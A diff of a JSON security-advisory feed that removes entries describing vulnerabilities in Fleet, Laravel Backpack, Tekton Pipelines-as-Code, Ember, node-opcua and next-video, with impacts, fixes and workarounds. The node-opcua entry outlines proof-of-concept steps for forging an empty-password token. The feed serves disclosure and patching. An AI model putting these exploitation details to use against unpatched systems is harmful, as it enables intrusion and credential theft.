-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54245",
-      "title": "Fleet: SQL injection in Okta conditional access endpoint allows host-controlled compromise of the Fleet database",
-      "summary": "### Summary\n\nA SQL injection vulnerability in Fleet's Okta conditional access integration could allow an attacker who controls a single enrolled host to read or modify arbitrary data in the Fleet database, including stored session tokens. Disclosed session tokens may be replayed to act as a global administrator, which on a managed fleet leads to remote code execution on enrolled hosts.\n\n### Impact\n\nWhen Fleet Premium with Okta conditional access is configured, an unauthenticated request path that supports the conditional access integration uses a host-supplied value in a database query without proper parameterization. Because the value is reported by the host's own agent and stored verbatim, any party that controls one enrolled host (the lowest-privilege role in the product) can influence the query.\n\nSuccessful exploitation could allow:\n\n- Disclosure of arbitrary database contents, including credentials and session tokens.\n- Replay of disclosed session tokens to gain global administrator access.\n- Subsequent actions available to a global administrator, including running scripts on enrolled hosts.\n\nThis issue requires Fleet Premium with the Okta conditional access integration enabled. It does not affect instances where Okta conditional access is not configured.\n\n### Workarounds\n\nIf an immediate upgrade is not possible, disable the Okta conditional access integration until the patched version is deployed.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\nEmail us at [security@fleetdm.com](mailto:security@fleetdm.com)\n\nJoin #fleet in [osquery Slack](https://join.slack.com/t/osquery/shared_invite/zt-h29zm0gk-s2DBtGUTW4CFel0f0IjTEw)\n\n### Credits\n\nWe thank @fuzzztf for responsibly disclosing this issue.",
-      "link": "https://github.com/advisories/GHSA-7q96-f8xw-jv5j",
-      "published": "2026-08-20T18:39:42Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54245"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54182",
-      "title": "Laravel Backpack CRUD: OS command injection in Stats::makeCurlRequest via attacker-controlled Host header (pre-auth)",
-      "summary": "## Summary\n\n`Backpack\\CRUD\\Stats::makeCurlRequest` builds a shell command using unescaped input that originates from the HTTP `Host` header, then passes it to `exec()`. A specially crafted Host header can break out of the shell argument and cause the server to execute arbitrary OS commands as the web user.\n\nThe vulnerable code path is reached from `BackpackServiceProvider::boot()` on every HTTP request in production when `exec()` and `curl` are available. A 1-in-100 random gate is the only guard \u2014 an attacker can reliably trigger it by retrying.\n\n## Severity\n\n**High \u2014 CVSS 8.1**  \n`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`\n\nAttack Complexity is rated **High** because default nginx and Apache configurations typically strip or reject malformed Host headers before they reach PHP, and `exec()` is often disabled for web processes in hardened environments. Both mitigations must be absent for exploitation.\n\n## Impact\n\nA successful exploit yields OS command execution as the web server user (`www-data`, `nginx`, etc.), giving an unauthenticated attacker access to environment secrets (APP_KEY, database credentials, API keys in `.env`), the filesystem, and any service the server can reach.\n\n## Fix\n\n`makeCurlRequest` was replaced with the Guzzle-based path already present in the codebase, eliminating the shell-command construction entirely. **Upgrade to a patched release immediately.**\n\n## Affected versions\n\n| Branch | Vulnerable range | First safe version |\n|--------|-----------------|-------------------|\n| 4.1.x  | `< 4.1.70`      | 4.1.70            |\n| 5.x    | `< 5.6.2`       | 5.6.2             |\n| 6.x    | `< 6.8.13`      | 6.8.13            |\n| 7.x    | `< 7.0.36`      | 7.0.36            |\n\n## Credits\n\nReported by Vishal Shukla ([@shukla304](https://github.com/shukla304)) via sechub.dev AI Agent.",
-      "link": "https://github.com/advisories/GHSA-mrc5-3mm3-45c5",
-      "published": "2026-08-20T18:38:55Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54182"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54180",
-      "title": "Laravel Backpack CRUD: CRUD panel query scopes are not enforced on Update, Delete, and Reorder (cross-tenant IDOR)",
-      "summary": "## Summary\n\nBackpack CRUD's list and read operations correctly apply any query scopes\nregistered via `addClause()` / `addBaseClause()` (e.g. tenant isolation, user\nownership). However, the **Update**, **Delete**, and **Reorder** operations\nbypassed these scopes, fetching records directly from the unscoped model query.\n\nAn authenticated user who knows or can guess a record's primary key could\ntherefore update, delete, or reorder records that should be invisible to them \u2014\na classic IDOR on write paths.\n\nApplications that rely on `addBaseClause` for row-level access control\n(multi-tenancy, per-user data isolation) are affected.\n\n## Impact\n\nAny Backpack CRUD panel that uses `addBaseClause` or `addClause` to restrict\nwhich rows a user may access is affected on its write operations.\nAn authenticated low-privilege user can modify or delete records belonging to\nother tenants / users.\n\n## Patches\n\nApply the fixed release for your major version:\n\n- **v6**: upgrade to **6.8.14** or later\n- **v7**: upgrade to **7.0.38** or later\n\nThe fix ensures Update, Delete, and Reorder all resolve records through the same\nscoped query used by the read side.\n\n## Workarounds\n\nIf you cannot upgrade immediately, add explicit `Gate` / `Policy` checks in your\n`CrudController`'s `update()`, `destroy()`, and `reorder()` methods to verify\nthe authenticated user is permitted to act on the resolved record.\n\n## Credits\n\nReported by Vishal Shukla ([@shukla304](https://github.com/shukla304)).",
-      "link": "https://github.com/advisories/GHSA-vgmv-8xjc-6rch",
-      "published": "2026-08-20T18:38:46Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54180"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54177",
-      "title": "Laravel Backpack CRUD: HasUploadFields keeps the attacker-supplied file extension \u2014 public-disk uploads of `shell.php` reach the webserver",
-      "summary": "## Summary\n\n`HasUploadFields` (used via `CrudTrait` on Backpack-managed models) and the `withFiles()` uploader preserve the client-supplied file extension without validation. On installations using a `public` disk with `php artisan storage:link`, this allows an authenticated administrator to upload a file with a server-executable extension that the web server will pass to the PHP interpreter - if no MIME or other type of upload validation is present.\n\n## Details\n\nThe `uploadFileToDisk` and `uploadMultipleFilesToDisk` methods hash the filename stem but write the client-supplied extension to disk verbatim \u2014 no allowlist, blocklist, or MIME check is applied inside the trait itself.\n\nThe newer `withFiles()` path (via `FileNameGenerator`) resolves the extension from the file's MIME type rather than the client filename, but also does not block server-executable types.\n\nApplications that follow the Backpack quickstart without adding explicit `mimes:` or `mimetypes:` validation rules in their form requests are affected.\n\n## Impact\n\nAn authenticated administrator with access to an upload-enabled CRUD panel, on a site using the `public` disk with web-accessible storage and no MIME type validation, can upload a server-executable file and achieve remote code execution.\n\n**Conditions required for exploitation:**\n\n- Authenticated admin access to a Backpack CRUD panel\n- An upload field with no `mimes:` / `mimetypes:` validation rule\n- The `public` disk in use (standard pattern for web-visible uploads)\n- `php artisan storage:link` in place\n- A web server + PHP-FPM stack (default on most hosts)\n\n## Fix\n\nA denylist for server-executable extensions has been added to both `HasUploadFields` and `FileNameGenerator`. Image-typed fields now additionally enforce an allowlist. This is defence-in-depth \u2014 it does not replace application-level validation.\n\n## Recommended developer action\n\nReview all upload fields and add explicit `mimes:` or `mimetypes:` validation in your form requests or fiel",
-      "link": "https://github.com/advisories/GHSA-8q2w-pv9p-mjvc",
-      "published": "2026-08-20T18:38:34Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54177"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54168",
-      "title": "Tekton Pipelines-as-Code: Unscoped GitHub App installation token allows unauthorized access to private repositories via remote task resolution",
-      "summary": "### Impact\nWhen Pipelines-as-Code is configured with a GitHub App installed across multiple repositories, the installation token issued during webhook processing is not scoped to the triggering repository by default. The token retains access to all repositories in the GitHub App installation.\n\nThis allows a user with push access to any repository in the installation to craft a PipelineRun with a remote task annotation pointing at a private repository in the same installation:\n```\npipelinesascode.tekton.dev/task: \"https://github.com/org/private-repo/blob/main/.tekton/secret-task.yaml\"\n```\nPipelines-as-Code resolves and inlines the remote task using the unscoped token, exposing the contents of the private repository's Tekton definitions. This is a read-only confidentiality breach, no write access is exposed.\n\n### Patches\nThe fix extracts the repository ID from the webhook payload during initial parsing so that it is available for later use. It then adds a fallback in the client setup path so that when no explicit scoping configuration is present and `ScopeTokenToListOfRepos` returns empty, the token is re-issued scoped to the triggering repository's ID rather than retaining access to the entire installation. The initial token remains unscoped so that the extra-repos lookup can still discover and resolve additional repositories when configured.\n\nThe fix is available in v0.48.0. Supported backport releases will be added here after release tags are published.\n\n### Workarounds\nLimit the GitHub App installation to only the repositories that require Pipelines-as-Code. Avoid org-wide installations or mixed-trust installations where repositories with different access requirements share the same GitHub App. This restricts the blast radius of the unscoped token to only the repositories that are explicitly selected during App installation.\n\n### Credits\nReported and fixed by the Pipelines-as-Code maintainers.",
-      "link": "https://github.com/advisories/GHSA-6f2p-296r-cc28",
-      "published": "2026-08-20T18:36:40Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54168"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54167",
-      "title": "Pipelines-as-Code GitHub App token request can be redirected via untrusted Enterprise Host header",
-      "summary": "## Impact\n\nPipelines-as-Code installations using the GitHub App provider are vulnerable to GitHub App credential exfiltration through the webhook endpoint.\n\nAffected versions accepted the `X-GitHub-Enterprise-Host` request header as the GitHub Enterprise API host during GitHub App token generation. For GitHub webhook events containing an `installation.id`, Pipelines-as-Code generated a GitHub App JWT and requested an installation access token before validating the webhook signature or checking that the Enterprise host matched the repository URL in the signed payload.\n\nAn attacker who can reach the Pipelines-as-Code webhook endpoint can send a crafted GitHub webhook payload containing an installation ID and set `X-GitHub-Enterprise-Host` to an attacker-controlled host. During token generation, the controller signs a GitHub App JWT locally and sends it to the selected API host. This can disclose the GitHub App JWT to the attacker-controlled service, allowing the attacker to attempt to mint GitHub App installation access tokens within the JWT validity window, subject to the GitHub App installation and permissions.\n\nThe incoming webhook flow also trusted `X-GitHub-Enterprise-Host` during GitHub App installation lookup and token generation. In that path, exploitation requires a valid incoming webhook secret for the target Repository CR.\n\n## Patches\n\nThe fix validates the webhook signature before GitHub App token generation, verifies that `X-GitHub-Enterprise-Host` matches the repository URL in the webhook payload, and stops using the request header to select the GitHub Enterprise host for incoming webhook token requests. For incoming webhooks, the Enterprise host is derived from the configured Repository URL instead.\n\nThe fix is available in v0.48.0. Supported backport releases will be added here after release tags are published.\n\n## Workarounds\n\nUntil a patched release is deployed, operators should block or strip unexpected `X-GitHub-Enterprise-Host` headers at the ingr",
-      "link": "https://github.com/advisories/GHSA-f5f4-3hh4-f54m",
-      "published": "2026-08-20T18:36:30Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54167"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54162",
-      "title": "Ember has unneutralized terminal escape/control sequences from Caddy logs injected into the operator's TUI",
-      "summary": "## Summary\n\nEmber's interactive TUI renders fields taken from the monitored Caddy server's access logs \u2014 most notably the request URI \u2014 straight to the operator's terminal without neutralising terminal escape or control sequences (CWE-150). Those log fields are populated from arbitrary, unauthenticated HTTP requests, so any remote client can embed ANSI/OSC/CSI control bytes that the operator's terminal emulator interprets when the log row is displayed. The bytes survive the whole pipeline: Caddy escapes them into its JSON access log as unicode escapes, ember's `ParseLogLine` decodes them back to raw `0x1b`/`0x07` bytes, and the row formatters concatenate them into the bubbletea `View()` output with no encoding before they reach `os.Stdout`.\n\n## Impact\n\nAn **unauthenticated, remote** attacker who can send HTTP requests to the Caddy server that ember monitors can inject terminal escape sequences into the operator's TUI. The trigger is a single ordinary HTTP request with control bytes in the request target. It requires no authentication; because the payload is reflected through Caddy's normal access log, it works even when ember's log listener is bound only to loopback. When the operator views the Logs tab \u2014 ember's default, zero-config mode \u2014 the terminal emulator interprets the injected sequences. Broadly-supported, demonstrated impact includes:\n\n- **Monitoring-dashboard spoofing** \u2014 CSI cursor/erase/scroll sequences forge or hide log rows so the operator misjudges the monitored server's state.\n- **Clipboard hijacking (OSC 52)** \u2014 attacker-chosen text is written into the operator's system clipboard, staging a payload the operator may later paste into a shell.\n- **Window-title spoofing (OSC 0/2)** \u2014 to support social engineering.\n\nThe impact ceiling depends on the operator's terminal emulator and usually requires a further operator action (e.g. a paste) to fully escalate; this is not general-case RCE, though specific terminal emulators have historically escalated esca",
-      "link": "https://github.com/advisories/GHSA-x3g7-qrwc-f6c5",
-      "published": "2026-08-20T18:36:01Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54162"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54155",
-      "title": "node-opcua missing nonce verification in UserNameIdentityToken authentication",
-      "summary": "**Summary**\nA missing nonce verification in the UserNameIdentityToken authentication handler allows an unauthenticated remote attacker to forge a password token that extracts as an empty string, and to replay captured authentication tokens across sessions.\n\n**Affected versions:** <= 2.165.0\n**Tested version:** 2.165.0\n**CVSS Score:** 8.1 (High)\n**CVSS Vector:** CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L\n**CWE:** CWE-347 Improper Verification of Cryptographic Signature\n\n---\n\n**Root Cause**\n\nIn `packages/node-opcua-server/source/opcua_server.ts` at line 1886-1887, after RSA-OAEP decrypting the UserNameIdentityToken password blob, the server reads a 4-byte little-endian length field and extracts `buff[4 : 4+length]` as the password. It never verifies that the trailing bytes equal `session.nonce`.\n\nThis has two consequences:\n\n1. **Forged empty password:** An attacker who retrieves the server's public key via an unauthenticated `GetEndpoints` call can craft a token where the 4-byte length field equals `serverNonce.length` (32). The server computes `length = 32 - 32 = 0` and calls `isValidUser(username, \"\")`. Any account that accepts an empty password is compromised.\n\n2. **Unconditional replay attack:** Because nonce binding is structurally absent, any captured UserNameIdentityToken ciphertext can be replayed in a different session unconditionally.\n\nThe impact is compounded by a second issue: when the channel uses `SecurityMode=None`, `verifyClientSignature` returns `true` unconditionally (security_policy.ts:697-700), bypassing the channel-level signature check entirely.\n\n---\n\n**Proof of Concept (logic, no exploit code)**\n\n```\n1. GetEndpoints (unauthenticated) \u2192 retrieve server public key and RSA token policy\n2. OpenSecureChannel (SecurityMode=None)\n3. CreateSession\n4. Craft plaintext: [0x20, 0x00, 0x00, 0x00]  (readUInt32LE = 32 = serverNonce.length)\n5. RSA-OAEP encrypt with server public key \u2192 256-byte ciphertext\n6. ActivateSession with crafted UserNameIdentityToken\n7",
-      "link": "https://github.com/advisories/GHSA-mq36-523m-x7vv",
-      "published": "2026-08-20T18:35:33Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54155"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54150",
-      "title": "next-video: Unauthenticated arbitrary file read via /api/video request handler",
-      "summary": "### Impact\n\nThe HTTP route handler exported by `next-video/request-handler` \u2014 which the README instructs consumers to mount at `/api/video` \u2014 allows an unauthenticated remote attacker to read arbitrary `.json` files from the production filesystem of any application following the documented setup.\n\nThe handler's `GET` endpoint accepts a `url` query parameter and uses it to locate and serve a JSON asset descriptor from disk. The only guard between \"remote URL\" and \"local file path\" is a regex check for `^https?://`. Any value that does not match that prefix is treated as a local path, `.json` is appended, and the file is read with `fs.readFile` and returned in the HTTP response \u2014 with no authentication, no path canonicalization, and no traversal guard.\n\nOn a typical Next.js deployment this exposes, at minimum:\n- The **Next.js Server Actions AES encryption key** (`.next/server/server-reference-manifest.json`)\n- The **Next.js Preview/Draft Mode keys** (`previewModeId`, `previewModeSigningKey`, `previewModeEncryptionKey`)\n- Internal build manifests, route registries, and absolute runtime paths\n- Application-specific asset metadata (e.g. Mux `uploadId`, `assetId`, `playbackId` values stored in `videos/*.json`)\n\nAny application that mounted `/api/video` following the documented one-liner is affected.\n\n### Patches\n\n2.8.1\n\n### Workarounds\n\nUntil a patched version is available, wrap the exported handler in your own route file and validate the `url` parameter before passing it through:\n\n- Reject any `url` value that does not begin with `https://`, or that does not match a known allowlist of trusted remote hosts.\n- Alternatively, remove the `/api/video` route entirely if your application only uses build-time `import` of local video files and does not use `<Video src=\"https://...\">` with string URLs at runtime.\n\n### References\n\n- `src/request-handler.ts` \u2014 the vulnerable GET handler\n- `src/assets.ts` \u2014 `getAssetPath()`, where the local-vs-remote branching occurs\n- `src/utils/uti",
-      "link": "https://github.com/advisories/GHSA-2p39-2jf3-fv2q",
-      "published": "2026-08-20T18:35:11Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54150"
+        "CVE-2026-63004"
       ],
       "is_zero_day": false,
       "is_high_severity": true
